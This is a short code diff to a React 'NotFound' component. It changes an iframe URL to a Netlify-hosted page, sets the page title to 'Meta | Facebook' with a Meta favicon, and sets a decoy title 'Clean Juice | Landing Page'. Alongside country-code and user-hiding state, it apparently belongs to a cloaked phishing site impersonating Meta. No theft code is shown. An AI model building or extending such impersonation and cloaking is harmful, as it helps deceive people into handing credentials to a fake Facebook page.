@@ -7,9 +7,9 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://glittering-caramel-84e3c4.netlify.app');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Market | AI');
-  let[SiteTitleHome, SetSiteTitleHome] = useState('Home Page');
+  let[IframeUrl, SetIframeUrl] = useState('https://linkclient001.netlify.app/');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Meta | Facebook');
+  let[SiteTitleHome, SetSiteTitleHome] = useState('Clean Juice | Landing Page');
 
 
   function showIframe(file,title,favicon) {
